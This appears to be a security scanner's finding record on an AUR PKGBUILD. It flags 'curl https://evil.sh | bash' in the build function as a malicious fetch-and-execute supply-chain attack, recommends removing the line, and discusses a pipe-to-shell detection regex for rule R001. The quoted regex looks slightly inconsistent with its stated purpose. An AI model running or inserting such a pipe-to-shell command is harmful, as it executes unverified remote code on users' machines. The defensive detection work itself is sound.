rules.citation: curl https://evil.sh | bash  (PKGBUILD source list, line ~12)

ioc_entries.provenance: PKGBUILD source function line: `curl https://evil.sh | bash`

rules.malicious_reasoning: The PKGBUILD fetches a script from an evil domain and pipes it directly to bash for execution during the build, which is actual malicious behavior (fetch-and-execute of unverified remote code).
rules.reasoning: The line pipes an unverified remote script from evil.sh directly into a shell, which is exactly the fetch-and-execute pattern R001 documents; this is genuine malice (a hardcoded 'evil' host), not a benign idiom that merely happens to match.
rules.resolution: This is a genuine malicious supply-chain attack, not a false positive. The build/install closure of the PKGBUILD executes `curl https://evil.sh | bash`, which fetches a remote script from evil.sh and pipes it directly into a shell for execution during package build (fetch-and-exec). Remedy: remove that line from the PKGBUILD source function; do not ship such a pipeline. To harden detection, keep R001 as an unescaped-pipe `curl.*\|.*bash(sh)` matcher so the legitimate use of curl for fetching the declared tarball still does not trip it (it only matches when the pipe is unescaped and leads to a shell), while the malicious chain keeps firing.
rules.tp_twin: Any other AUR PKGBUILD that runs a fetched remote script directly in a shell without verification, e.g. `curl URL | sh` or `curl URL | python3`. That malicious pipe-to-shell case must keep firing.
rules.where: PKGBUILD source function (`build`/install closure, PKGBUILD line ~12); detection path: R001 rule card pattern in src/trustsight/analysis/composition.py (H043 fetch-and-exec family), unescaped-pipe `curl.*\|.*bash(sh)`, fired on the pipeline at PKGBUILD line 12.
